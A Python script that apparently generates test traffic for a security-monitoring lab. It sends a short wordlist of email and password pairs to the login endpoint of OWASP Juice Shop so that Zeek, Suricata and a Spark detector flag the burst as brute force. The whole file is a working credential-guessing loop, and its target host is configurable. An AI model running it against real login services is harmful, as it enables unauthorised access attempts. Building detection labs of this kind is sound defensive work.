#!/usr/bin/env python3
"""
Controlled Authentication Attack Pattern (Brute Force).
Generates rapid repeated failed login attempts against OWASP Juice Shop.
Observed by: Zeek (http.log 401s), Suricata (rule 1000002)
Detected by: Spark Structured Streaming (BRUTE_FORCE threat classification)
"""

import os
import time
import requests

TARGET_HOST = os.getenv("TARGET_HOST", "localhost")
TARGET_PORT = int(os.getenv("TARGET_PORT", 3000))
LOGIN_URL = f"http://{TARGET_HOST}:{TARGET_PORT}/rest/user/login"

WORDLIST = [
    ("admin@juice-sh.op", "wrongpass1"),
    ("admin@juice-sh.op", "admin1234"),
    ("admin@juice-sh.op", "password123"),
    ("admin@juice-sh.op", "letmein2026"),
    ("secops@test.local", "toor1234"),
    ("root@juice-sh.op", "supersecret"),
    ("administrator@juice-sh.op", "12345678"),
    ("guest@juice-sh.op", "guestpass")
]

def run_brute_force():
    print(f"\n[!] INITIATING AUTHENTICATION ATTACK PATTERN against {LOGIN_URL}...")
    headers = {"Content-Type": "application/json"}
    
    for idx, (user, pwd) in enumerate(WORDLIST):
        payload = {"email": user, "password": pwd}
        try:
            r = requests.post(LOGIN_URL, json=payload, headers=headers, timeout=2.0)
            status = r.status_code
            print(f"  [{idx+1}/{len(WORDLIST)}] Attempt login '{user}':'{pwd}' -> HTTP {status} (Expected 401)")
        except Exception as e:
            print(f"  [{idx+1}/{len(WORDLIST)}] Attempt error: {e}")
        time.sleep(0.3)
        
    print(f"[+] Authentication burst completed. Real 401 logs sent to Zeek/Suricata.")

if __name__ == "__main__":
    run_brute_force()
